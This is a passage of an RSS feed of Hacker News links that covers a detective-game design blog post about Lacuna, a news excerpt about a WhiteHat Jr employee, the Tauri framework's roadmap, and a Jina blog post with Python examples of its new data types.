<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="blog">
            <div>
                <div>
					
                    <div>

                        <div>


    <div>

                    <p>Game design is such a wide and varied discipline that job titles in the field have become increasingly granular over the years – and ever since we started working on our debut title Lacuna, I've become more and more convinced that "detective game designer" merits its own denomination as well. Detective gameplay (or "investigation gameplay") poses a number of unique challenges centered around two main problems: the <strong>struggle between story and puzzles</strong> (or "cases") as well as <strong>communication between the player and the game</strong>.</p>
<p>Since some of the explanations will be using our own game as an example, let me give you a quick rundown: Lacuna is a story-driven adventure with platformer controls and investigation elements. Its four fundamental gameplay types are dialogs (with choices), moving around, examining objects, and solving puzzles. All of them are staples of the point &amp; click genre, but their execution is quite unique; I don't want to go into more detail here because it's not pertinent to the topic, but you can <a href="http://lacuna.game/">check out the game on Steam</a> if you want to know more.</p>
<p><img alt="Gameplay" src="https://digitales.games/user/pages/03.blog/detective-game-design-problems/gameplay-movement.gif"><br>
<em>This is what the game looks like</em></p>
<h2>Story vs. puzzles</h2>
<p>A handful of abstract game design principles lie at Lacuna's core. For instance, "no takebacks" dictates that the player only get one shot at every decision, dialog, and puzzle. The game auto-saves and doesn't allow you to go back if you performed poorly or regret an earlier decision. There's also "limited feedback", which means that the player often isn't told immediately whether a solution was correct and what the consequences of their actions and decisions will be.</p>
<p>However, there's one in particular I want to highlight here because it concerns the above mentioned divide between story and puzzling in detective games: <strong>No getting stuck.</strong></p>
<p>The thought process behind it was simple: In games with both a story and puzzles (e.g. most P&amp;C games), story progress is almost always tied directly to puzzle progress. Until you solve the puzzle at hand, you don't get to see the next part of the story. For some players, especially those most interested in the story, this can become a problem. If they're stuck for too long, there's a chance they'll just drop out and never pick the game up again. Even if that doesn't happen, hard puzzles always run the risk of messing up the story's pacing and interrupting your immersion in the game – because you're becoming frustrated or, even worse, because you decide to tab out and Google the solution. To avoid people getting stuck, we considered a number of solutions:</p>
<p><strong>Solution 1: Make the puzzles very easy?</strong><br>
This isn't our favorite since it somewhat defeats the purpose of puzzles. They'd still play a role as a change of pace now and then, but if puzzles aren't a little hard, nobody will feel like a detective solving them. Some early puzzles in Lacuna are easy, but most aren't.</p>
<p><strong>Solution 2: Provide hints?</strong><br>
Hint systems can be found in many adventures featuring puzzles. Unfortunately, they often take the player out of the experience in one of three ways: In some cases, the hint is provided by extradiegetic UI (e.g. in the pause menu) and therefore seems to come out of nowhere in the game world. In other cases, the player character is the one giving the hint, disconnecting the player from their avatar’s perspective. The third option of NPCs providing hints is a little better; however, it is often hard to justify <em>why</em> an NPC would be able to point the player in the right direction without possessing the rest of the solution to the ongoing puzzle (and why they didn't volunteer it in the first place). The two types of (sort-of) hint systems we went with in Lacuna are <em>Highlight Mode</em>, which displays optional outlines around objects and NPCs that hold new information, and <em>redundant information</em>, meaning that sometimes the player is given two ways of obtaining an important clue.</p>
<p><img alt="Hints" src="https://digitales.games/user/pages/03.blog/detective-game-design-problems/solutions-hints.png"><br>
<em>"YOU ARE PLAYING A GAME RIGHT NOW"</em></p>
<p><strong>Solution 3: Decouple story progress from puzzle progress?</strong><br>
Why not simply make a story-driven game throughout which the player can solve the occasional puzzle if they feel like it? Well, because it would require that puzzles be somewhat detached from the story. As a result, they run the risk of feeling meaningless since solving them is not rewarding and failing is not punishing. However, this <em>can</em> work quite well when combined with...</p>
<p><strong>Solution 4: Make branching content for different solutions?</strong><br>
Instead of impeding the player’s progress, wrong or missing puzzle solutions could lead to a less desirable continuation and/or outcome of the story. Unfortunately, creating a new story branch for each and every wrong solution to a puzzle is hardly feasible. However, there are less extreme ways of realizing this. For instance, the game could account for the player’s <em>overall</em> puzzling performance at certain points in the game, e.g. trigger the “good” finale to an act if they got more than x% of the puzzles right, and the “bad” one if not. There could also be cascading consequences of sorts, e.g. solving one case correctly may give the player an edge in a later one. These approaches have similar downsides as optional puzzles do, but to a lesser degree; puzzle success no longer being required for progress makes them feel more detached from the story and removes immediate feedback. Regardless, we have found this to be the best solution, which is why we employ it quite a bit in Lacuna (while trying to avoid all the pitfalls). By the way, if all of this is becoming too abstract for you, bear with us! The second half of this post is all about a real example from the game.</p>
<p><img alt="Detroit: Become Human" src="https://digitales.games/user/pages/03.blog/detective-game-design-problems/solutions-branching-content.jpg"><br>
<em>Detroit: Become Human offers an astonishing number of different outcomes depending on player action, but not everybody has that kind of money to burn</em></p>
<p>Despite all of these measures being taken to make sure that the player won't get stuck, Lacuna can still be called a hard game. While it's not difficult to get <em>to</em> the end, it's pretty difficult to get a <em>good</em> ending and not mess things up on your way there. In other words, rushing through the whole story is possible if you don't mind bringing it to a terrible conclusion.</p>
<h2>Communicating with the game</h2>
<p>While the previous chapter only concerns detective games that also prominently feature a story, this next one is relevant to pretty much every detective game every made. It addresses the topic of communication between the player and the game, and especially how the player can express their thoughts to it. Several principles have proven to make for a good experience across countless approaches to this problem over the years:</p>
<p><strong>Principle 1: Many channels out, few channels back in.</strong><br>
If the game conveys information to the player on many different channels and in many different ways, the process of piecing the solution together tends to feel more interesting and rewarding. In Lacuna, the player picks up clues from dialogs, objects, environments, the news, and e-mails (with all sorts of attachments). At the same time, the channels via which the player communicates that solution back to the game are kept to a minimum, namely cloze texts we like to call "Case Sheets" and (to a lesser degree) dialog choices. Having one or two central mechanics for player input makes the experience more coherent and transparent and facilitates designing the mysteries around it.</p>
<p><img alt="Obra Dinn" src="https://digitales.games/user/pages/03.blog/detective-game-design-problems/solutions-obra-dinn.jpg"><br>
<em>Return of the Obra Dinn by Lucas Pope provides a bunch of different sources of information, but just one central mechanic for the player to communicate back to the game</em></p>
<p><strong>Principle 2: Have the player communicate only the solution.</strong><br>
It is near impossible to create a system through which the player communicates to the game <em>how</em> they arrived at a solution. Luckily, this is not necessary. A well-designed puzzle provides all the information, then moves the entire solution process solely <em>into the player’s head</em>, and finally prompts the player to input only their answer. The player’s objective should be stated clearly, but in a very general way at the start of a case (e.g. “find the culprit”).</p>
<p><strong>Principle 3: Give the player maximum freedom in communicating the solution.</strong><br>
The way in which the player communicates the answer to the game is the most crucial part to get right. One aspect is to give the player many choices (or a large combination of choices) to pick from. Two things should be avoided: 1. Giving the player a high probability to succeed by picking a random answer. 2. Making it easy for the player to guess correctly because only one or a few of the available answers appear plausible. An example for a bad solution like this would be to give the player three dialog choices to solve the puzzle; even worse would be if one of them obviously made the most sense. A better approach would be to give the player a cloze text with a bunch of plausible options for each gap. Another possibility is to have the solution be an unguessable string of characters that the player needs to enter manually. Both ideas utilize combinatorial explosion to make guessing and brute-forcing nearly impossible.</p>
<p><img alt="Detective Grimoire" src="https://digitales.games/user/pages/03.blog/detective-game-design-problems/solutions-case-sheets.jpg"><br>
<em>Good luck brute-forcing your way through Detective Grimoire's cloze texts</em></p>
<h2>Puzzle example</h2>
<p>Hopefullly all this will become crystal clear when put to concrete use! The following is an early level in Lacuna. It doesn't contain some of the difficulties added later (like a large number of channels communicating potential evidence). In harder cases, the player will need to have paid attention to testimonies, news articles etc. from earlier levels to arrive at the correct conclusion, and some cases span multiple levels. Not this one, though; all the information required to solve it is directly contained in the clues and dialogs of the one level where it starts and ends.</p>
<p>This chapter won't reveal much of importance about the story, but it will spoil the solution to this one puzzle, so consider yourself warned.</p>
<h3>The puzzle</h3>
<p>Here's what happens: Our protagonist Neil is called to a …</p></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://digitales.games/blog/detective-game-design-problems">https://digitales.games/blog/detective-game-design-problems</a></em></p>]]>
            </description>
            <link>https://digitales.games/blog/detective-game-design-problems</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185571</guid>
            <pubDate>Mon, 23 Nov 2020 11:11:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhiteHat Jr is a startup hell]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185492">thread link</a>) | @jatins
<br/>
November 23, 2020 | https://themorningcontext.com/indias-whitehatjr-is-startup-hell/# | <a href="https://web.archive.org/web/*/https://themorningcontext.com/indias-whitehatjr-is-startup-hell/#">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p><strong><span>S</span>haarif Ansari got the call on 11 November</strong> at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p> <p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p> <p>Once he reached the station, Ansari found two people waiting for him</p></div></div></div></div></div>]]>
            </description>
            <link>https://themorningcontext.com/indias-whitehatjr-is-startup-hell/#</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185492</guid>
            <pubDate>Mon, 23 Nov 2020 10:57:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tauri – desktop applications with a web front end]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185376">thread link</a>) | @dsego
<br/>
November 23, 2020 | https://tauri.studio/en/ | <a href="https://web.archive.org/web/*/https://tauri.studio/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__docusaurus">
<nav></nav><div><main><section><div><div><div><div><div><p><img src="https://tauri.studio/en/img/undraw_brownfield.svg" alt="Brownfield"></p><h3>Brownfield</h3><p>compatibility with any front-end framework means you don't have to change your stack</p></div></div></div><div><div><div><p><img src="https://tauri.studio/en/img/undraw_open_source.svg" alt="FLOSS"></p><h3>FLOSS</h3><p>relicensing is possible with Tauri</p></div></div></div><div><div><div><p><img src="https://tauri.studio/en/img/undraw_takeout_boxes.svg" alt="Bundle"></p><h3>Bundle</h3><p>size of a Tauri App can be less than 600KB</p></div></div></div></div><div><div><div><div><p><img src="https://tauri.studio/en/img/undraw_security.svg" alt="Security"></p><h3>Security</h3><p>is the Tauri-Team's biggest priority and drives our innovation</p></div></div></div><div><div><div><p><img src="https://tauri.studio/en/img/undraw_patterns.svg" alt="Patterns"></p><h3>Patterns</h3><p>are here to help you choose important features with simple configuration</p></div></div></div><div><div><div><p><img src="https://tauri.studio/en/img/undraw_cross_platform.svg" alt="Cross-platform"></p><h3>Cross-platform</h3><p>compilation allows to bundle binaries for major desktop platforms (mobile &amp; WASM coming soon)</p></div></div></div></div></div></section><section><div id="roadmap"><h2>Roadmap</h2><p>Notice: This roadmap is subject to change.</p><ul><li><span></span> To Do</li><li><span></span> Milestone</li><li><span></span> Ready</li></ul><ul><li><div><p>CLI</p><p>Generate, develop and build Tauri apps from the command line.</p></div><p>Q4 2019</p></li><li><div><p>API</p><p>Finalize, audit, write documentation and create examples for the smoke-tests.</p></div><p>Q4 2019</p></li><li><div><p>Testing &amp; CI</p><p>Implement CI with testing and bundle-pipeline validation.</p></div><p>Q4 2019</p></li><li><div><p>Desktop Bundler</p><p>Bundle for all major desktops from native systems.</p></div><p>Q4 2019</p></li><li><div><p>Alpha Release</p><p>Technical Release Candidate for desktop, edge cases and bugs acceptable.</p></div><p>Q4 2019</p></li><li><div><p>Sideloader</p><p>Integrate and instrument other binaries.</p></div><p>Q1 2020</p></li><li><div><p>Splashscreen</p><p>Use a splashscreen while the main content is loading.</p></div><p>Q1 2020</p></li><li><div><p>App Storage</p><p>Use a canonical location to store userdata.</p></div><p>Q2 2020</p></li><li><div><p>Native Notifications</p><p>Cross-platform notifications using polyfilled WEB API.</p></div><p>Q2 2020</p></li><li><div><p>GH Action for Building Apps</p><p>Build your Web application as a Tauri binary for MacOS, Linux and Windows</p></div><p>Q3 2020</p></li><li><div><p>VS Code Extension</p><p>Commands and validate tauri.conf.json</p></div><p>Q3 2020</p></li><li><div><p>Core Plugin System</p><p>Build reusable plugins to extend Tauri core.</p></div><p>Q3 2020</p></li><li><div><p>CLI Updater</p><p>Update core dependencies automatically from the CLI.</p></div><p>Q3 2020</p></li><li><div><p>Self Updater</p><p>Update Tauri Apps from within Tauri.</p></div><p>Q3 2020</p></li><li><div><p>Clipboard</p><p>Enable programmatic and keyboard access to clipboard.</p></div><p>Q3 2020</p></li><li><div><p>Keyboard Shortcuts</p><p>Hook and react to keypresses.</p></div><p>Q3 2020</p></li><li><div><p>Channel API</p><p>Send messages through a channel.</p></div><p>Q3 2020</p></li><li><div><p>One-Time Commands</p><p>Run a command that is no longer available after first run.</p></div><p>Q3 2020</p></li><li><div><p>WASM Bundler</p><p>Manufacture WASM bundler for use in websites.</p></div><p>Q3 2020</p></li><li><div><p>App Tray</p><p>Desktop Cross-platform Icon Tray.</p></div><p>Q3 2020</p></li><li><div><p>Webview Bindings</p><p>Use official Webview bindings.</p></div><p>Q3 2020</p></li><li><div><p>Multi Window</p><p>Run multiple window instances in Tauri.</p></div><p>Q3 2020</p></li><li><div><p>Transparent Window</p><p>Have transparent windows.</p></div><p>Q3 2020</p></li><li><div><p>Rust-based CLI</p><p>Create rust CLI with DENO bindings and binary.</p></div><p>Q3 2020</p></li><li><div><p>DENO Bindings</p><p>Use Deno to build your App's backend.</p></div><p>Q3 2020</p></li><li><div><p>Beta Release</p><p>Generally stable on Desktop, API locked down.</p></div><p>Q4 2020</p></li><li><div><p>Security Audit</p><p>3rd party security audit of core libraries.</p></div><p>Q4 2020</p></li><li><div><p>Mobile Bundler</p><p>Bundle to all major mobile device operating systems.</p></div><p>Q4 2020</p></li><li><div><p>Cross Compiler</p><p>Generate bundled binaries from select operating system environments.</p></div><p>Q4 2020</p></li><li><div><p>PureOS App Store</p><p>Verified builds for PureOS.</p></div><p>Q1 2021</p></li><li><div><p>Stable Release</p><p>Stable on On all Platforms.</p></div><p>Q1 2021</p></li><li><div><p>Other Bindings</p><p>Go, Nim, Python, C++ and other bindings are possible with the stable API.</p></div><p>Q1 2021</p></li><li><div><p>Alternative Renderer</p><p>Candidate presentation for Webview Alternatives, including GL windowing.</p></div><p>Q1 2021</p></li><li><div><p>Tauri-Frida</p><p>A decompiler and threat analyzer for Tauri Apps, using Frida.</p></div><p>Q1 2021</p></li><li><div><p>The Future</p><p>Something missing? Got a great idea? We want you to help us make it happen.</p></div><p>&amp; BEYOND</p></li></ul></div></section></main></div></div></div>]]>
            </description>
            <link>https://tauri.studio/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185376</guid>
            <pubDate>Mon, 23 Nov 2020 10:36:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Primitive Data Types in Neural Search System]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185355">thread link</a>) | @artex_xh
<br/>
November 23, 2020 | https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/ | <a href="https://web.archive.org/web/*/https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A primitive data type is a data type for which the programming language provides built-in support. When it comes to framework design, primitive types often refer to the basic building blocks, allowing more complicated composite types to be recursively constructed. Examples such as <code>ndarray</code> in Numpy, <code>tensor</code> in Tensorflow: when writing a Numpy or Tensorflow program, the main object manipulated and passed around is those primitive data types.<a id="more"></a></p><p>What is the primitive data type in Jina then? To many readers and users of Jina, <a href="https://101.jina.ai/" target="_blank" rel="noopener">the concept of</a> <code>Executor</code>, <code>Driver</code>, <code>Pea</code>, <code>Pod</code>, <code>Flow</code> should be very familiar. They <a href="https://hanxiao.io/2020/08/02/Layer-of-Abstraction-when-Building-Tensorflow-for-Search/" title="define different abstraction layers">define different abstraction layers</a>, and together they compose the neural search design patterns. Thanks to these Jina idioms, one can quickly bootstrap a cross/multi-modality search system in no time. But are they primitive data types? No. Before <code>v0.8</code>, Jina has <em>no</em> primitive data type: drivers directly work with Protobuf messages for generating or parsing a stream of bytes in the network layer. The figure below illustrates this idea.</p><p><img src="https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/blog-types-01.png"></p><p>I will explain the new <strong>primitive data types</strong> <code>Document</code>, <code>QueryLang</code>, <code>NdArray</code>; and the <strong>composite types</strong> <code>DocumentSet</code>, <code>QueryLangSet</code>, <code>Request</code>, and <code>Message</code> in this blog post. These data types are available since <code>v0.8</code> in the <a href="https://github.com/jina-ai/jina/tree/master/jina/types" target="_blank" rel="noopener">new <code>jina.types</code> module</a>. Primitive data types complete Jinaâ€™s design by clarifying the low-level data representation in Jina, yielding a much simpler, safer, and faster interface on the high-level. Most importantly, they ensure the universality and extensibility for Jina in the long-term.</p><div><p><strong>Jina</strong> is an easier way for enterprises and developers to build cross- &amp; multi-modal neural search systems on the cloud. You can use Jina to bootstrap a text/image/video/audio search system in minutes. Give it a try:</p><p><a href="https://get.jina.ai/" target="_blank" rel="noopener"><img src="https://img.shields.io/github/stars/jina-ai/jina?label=Star%20Jina%20on%20Github&amp;style=for-the-badge&amp;logo=github&amp;color=3aa373" alt="GitHub Repo stars"></a></p></div><h4><span id="table-of-contents">Table of Contents</span></h4><ul><li><a href="#new-data-types">New Data Types</a><ul><li><a href="#primitive-types">Primitive Types</a></li><li><a href="#composite-types">Composite Types</a></li></ul></li><li><a href="#jina-data-types-in-action">Jina Data Types In Action</a><ul><li><a href="#setting-content">Setting Content</a></li><li><a href="#converting-content-types">Converting Content Types</a></li><li><a href="#construct-from-existing-document">Construct From Existing Document</a></li><li><a href="#unique-identifier-of-document">Unique Identifier of Document</a></li><li><a href="#access-nested-document">Access Nested Document</a></li><li><a href="#construct-query-language">Construct Query Language</a></li><li><a href="#construct-request">Construct Request</a></li></ul></li><li><a href="#design-decisions">Design Decisions</a></li></ul><h2><span id="new-data-types">New Data Types</span></h2><p>In <code>v0.8</code>, we introduced three primitive data types, four composite types, and some derived helper types.</p><h4><span id="primitive-types">Primitive Types</span></h4><ul><li><strong><code>Document</code></strong> is a basic data type for representing a real-world document. It can contain text, image, array, embedding, URI, and accompanied by rich meta information. It can be recurred both <a href="https://hanxiao.io/2020/08/28/What-s-New-in-Jina-v0-5/" title="vertically and horizontally">vertically and horizontally</a> to have nested documents and matched documents. <code>Document</code> is the main object <code>Client</code> and <code>Driver</code> work with. User creates it when preparing the input; and its lifetime spans over the entire indexing and searching processes in Jina.</li><li><strong><code>QueryLang</code></strong> is a basic data type for representing the <a href="https://hanxiao.io/2020/08/28/What-s-New-in-Jina-v0-5/" title="query language structure">query language structure</a>. <code>Client</code> can use <code>QueryLang</code> to build filter/sort/select queries and convert <a href="https://github.com/jina-ai/jina/tree/master/jina/drivers/querylang" target="_blank" rel="noopener">from/to <code>QLDriver</code></a>.</li><li><strong><code>NdArray</code></strong> is a basic data type for representing fixed-size multidimensional items of the same type. As the fundamental numeric type in Jina, <code>NdArray</code> is often used to represent <code>embedding</code>, <code>blob</code>, images, audios, texts; and joins the computation of other frameworks such as <code>numpy</code>, <code>tensorflow</code>, <code>pytorch</code>.<ul><li><strong><code>DenseNdArray</code></strong> is a specific data type for the dense representation of a <code>NdArray</code>. Same as <code>numpy.ndarray</code>, it contains values of all elements, the shape and the data type of each element. One can consider it as a <code>numpy.ndarray</code> <em>â€œviewâ€�</em> of the Protobuf data. <code>DenseNdArray</code> also provides a quantization interface to allow lossy compression.</li><li><strong><code>SparseNdArray</code></strong> is a specific data type for sparse representation of a <code>NdArray</code>, where substantial memory requirement reductions can be realized by storing only the non-zero entries. Jina <code>v0.8</code> provides the <code>scipy</code>, <code>tensorflow</code>, <code>pytorch</code> â€œviewsâ€� of the Protobuf data, which can directly join the corresponding frameworkâ€™s computation.</li></ul></li></ul><h4><span id="composite-types">Composite Types</span></h4><p>Besides primitive data types, three new composite types provide boxing on primitive types. This enables a more Pythonic interface and keeps the data safe from outside interference and misuse.</p><ul><li><strong><code>DocumentSet</code></strong> is a mutable sequence of <code>Document</code>. It allows one to slice/modify/add/delete the sequence and iterate over its element via a generator.</li><li><strong><code>QueryLangSet</code></strong> is a mutable sequence of <code>QueryLang</code>. Like <code>DocumentSet</code>, it allows one to slice/modify/add/delete the sequence and iterate over its element via a generator.</li><li><strong><code>Request</code></strong> is a data type for representing the message passing between Pods, <code>Client</code> and <code>Gateway</code>. It contains all data all Pods require, including <code>DocumentSet</code>, <code>QueryLangSet</code> and meta information. <code>Request</code> also provides a lazy interface to the underlying Protobuf data, avoiding unnecessary (de)serialization and (de)compression. The lifetime of <code>Request</code> spans over the entire indexing and searching processes in Jina: it is the first object users send to Jina and the final object retrieved from Jina.</li><li><strong><code>Message</code></strong> is a container of a Protobuf <code>Envelope</code> and the primitive type <code>Request</code>. It is the actual data type passing internally between Jina Pods.</li></ul><p>The next figure illustrates the connections between those data types:</p><p><img src="https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/blog-type-03.png"></p><h2><span id="jina-data-types-in-action">Jina Data Types In Action</span></h2><p>Now letâ€™s look at some examples. Say we have an image, and we want to create a <code>Document</code> to contain this image.<br></p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span></span><br><span><span>import</span> numpy</span><br><span>fake_img = numpy.random.randint(<span>0</span>, <span>255</span>, [<span>32</span>, <span>32</span>, <span>3</span>], dtype=numpy.uint8)</span><br></pre></td></tr></tbody></table></figure><p>As a comparision, the new way versus the old way of creating such document:</p><table><thead><tr><th>Primitive Type in <code>v0.8</code></th><th>Before</th></tr></thead><tbody><tr><td><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span> </span><br><span><span>from</span> jina <span>import</span> Document</span><br><span>d = Document(content=fake_img)</span><br></pre></td></tr></tbody></table></figure></td><td><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span> </span><br><span><span>from</span> jina.proto <span>import</span> jina_pb2</span><br><span><span>from</span> jina.helper <span>import</span> array2pb</span><br><span>d = jina_pb2.DocumentProto()</span><br><span></span><br><span>fake_img_pb = array2pb(fake_img)</span><br><span>d.blob.CopyFrom(fake_img_pb)</span><br><span></span><br></pre></td></tr></tbody></table></figure></td></tr><tr><td><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span> </span><br><span>numpy.testing.assert_equal(d.content, fake_img) </span><br></pre></td></tr></tbody></table></figure></td><td><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span> </span><br><span><span>from</span> jina.helper <span>import</span> pb2array</span><br><span>numpy.testing.assert_equal(pb2array(getattr(d, d.WhichOneof(<span>'content'</span>))), fake_img)</span><br></pre></td></tr></tbody></table></figure></td></tr></tbody></table><p>One can immediately notice that the new data type encapsulates the Protobuf access. That only scratches the surface of Jina data type. Letâ€™s now see more usages.</p><h4><span id="setting-content">Setting Content</span></h4><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span><span>from</span> jina <span>import</span> Document</span><br><span>d = Document()</span><br><span></span><br><span>d.content = <span>'123'</span></span><br><span></span><br><span>d.content = <span>b'1e2f2c'</span></span><br><span></span><br><span>d.content = np.random.random([<span>3</span>,<span>4</span>,<span>5</span>])</span><br></pre></td></tr></tbody></table></figure><p>The MIME type of the document is auto-guessed from the content.</p><h4><span id="converting-content-types">Converting Content Types</span></h4><p>One can use <code>convert_*</code> methods to switch between different document content. The example below reads the content from <code>README.md</code> into <code>text</code> field.</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>from</span> jina <span>import</span> Document</span><br><span>d = Document(uri=<span>'./README.md'</span>)</span><br><span>d.convert_uri_to_text()</span><br><span></span><br><span>print(d.content) </span><br></pre></td></tr></tbody></table></figure><h4><span id="construct-from-existing-document">Construct From Existing Document</span></h4><p><code>Document</code> object can be constructed from existing Document-like structure, such as binary or JSON string, <code>Dict</code> or a <code>DocumentProto</code> Protobuf object:</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span><span>from</span> jina <span>import</span> Document</span><br><span><span>from</span> jina.proto <span>import</span> jina_pb2</span><br><span></span><br><span></span><br><span>d1 = Document({<span>'text'</span>: <span>'hello world!'</span>})</span><br><span></span><br><span></span><br><span>d2 = Document(<span>b'j\x0chello world!'</span>)</span><br><span></span><br><span></span><br><span>d3 = Document(<span>'{"text": "hello world!"}'</span>)</span><br><span></span><br><span></span><br><span>d = jina_pb2.DocumentProto()</span><br><span>d.text = <span>'hello world!'</span></span><br><span>d4 = Document(d)</span><br></pre></td></tr></tbody></table></figure><h4><span id="unique-identifier-of-document">Unique Identifier of Document</span></h4><p>Since Jina v0.6, every document has a unique identifier <code>id</code> associated with all contents of the document. This ensures same content documents always have the same <code>id</code>. With the new <code>Document</code> type, the content-aware <code>id</code> can be set via <code>update_id()</code>, or get auto set when using it as a context manager:</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></pre></td><td><pre><span><span>from</span> jina <span>import</span> Document</span><br><span></span><br><span>d1 = Document()</span><br><span>d1.content = <span>'hello world'</span></span><br><span>d1.update_id()</span><br><span></span><br><span><span>with</span> Document() <span>as</span> d2:</span><br><span>    d2.content = <span>'hello world'</span></span><br><span></span><br><span><span>assert</span> d1.id == d2.id  </span><br></pre></td></tr></tbody></table></figure><h4><span id="access-nested-document">Access Nested Document</span></h4><p>Nested document can be accessed via properties <code>chunks</code> and <code>matches</code>. Both properties return a <code>DocumentSet</code> object, allowing one to access the nested documents as a Python <code>List</code>:</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></pre></td><td><pre><span><span>from</span> jina <span>import</span> Document</span><br><span>d = Document()</span><br><span>c1 = Document()</span><br><span>c2 = Document()</span><br><span>d.chunks.add(c1)</span><br><span>d.chunks[<span>0</span>].chunks.add(c2)</span><br><span></span><br><span><span>for</span> c <span>in</span> d.chunks:</span><br><span>    <span>for</span> cc <span>in</span> c.chunks:</span><br><span>        print(repr(cc))</span><br></pre></td></tr></tbody></table></figure><h4><span id="construct-query-language">Construct Query Language</span></h4><p>In Jina v0.5, we have introduced a new set of drivers for enabling query languages. Those drivers allow the user to override its parameter to get alternative result. One example is top-k retrieval or pagination, where the start and the end position of result slicing is a parameter at query time. With the new <code>QueryLang</code> type, constructing a query language becomes extremely simple.</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span><span>from</span> jina.drivers.querylang.slice <span>import</span> SliceQL</span><br><span><span>from</span> jina <span>import</span> QueryLang, Flow</span><br><span></span><br><span>ql = SliceQL(start=<span>3</span>, end=<span>5</span>, priority=<span>999</span>)</span><br><span>q = QueryLang(ql)</span><br><span></span><br><span><span>with</span> Flow() <span>as</span> f:</span><br><span>    f.index(..., queryset=q)</span><br></pre></td></tr></tbody></table></figure><p>Same as <code>Document</code>, a <code>QueryLang</code> object can be also constructed from binary or JSON string, <code>Dict</code> or a <code>QueryLangProto</code> object. To manage multiple <code>QueryLang</code> objects, one can use <code>QueryLangSet</code> similar to <code>DocumentSet</code>.</p><h4><span id="construct-request">Construct Request</span></h4><p>Putting everything together, constructing a <code>Request</code> on the client side becomes extremely easy and Pythonic:</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></pre></td><td><pre><span><span>from</span> jina <span>import</span> Request, Document, QueryLang</span><br><span></span><br><span><span><span>def</span> <span>generate_req</span><span>(batch: Iterator[Any], mode: str, queryset: Sequence[BaseDriver])</span> -&gt; Request:</span></span><br><span>    req = Request()</span><br><span>    req.request_type = str(mode)</span><br><span>    <span>for</span> c <span>in</span> batch:</span><br><span>        <span>with</span> Document(content=c) <span>as</span> d:</span><br><span>            req.docs.append(d)</span><br><span>    </span><br><span>    req.queryset.extend(queryset)</span><br><span>    <span>return</span> req</span><br></pre></td></tr></tbody></table></figure><h2><span id="design-decisions">Design Decisions</span></h2><p>Finally, letâ€™s review some design decisions made in Jina data types.</p><blockquote><p><strong>View, not copy.</strong></p></blockquote><p>As Protobuf object already provides a Python interface, which can be considered as a â€œstorageâ€� representation, we donâ€™t want to copy it or add another storage layer. Otherwise, it will introduce data inconsistency between the Protobuf object and the Jina data type object. Our goal is to provide an enhanced â€œviewâ€� to the Protobuf â€œstorageâ€� by maintaining a reference.</p><p>The next figure uses <code>Document</code> as an example and visualizes the relations between primitive, composite, and Protobuf data types.</p><p><img src="https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/blog-types-02.png"></p><blockquote><p><strong>Delegate, not 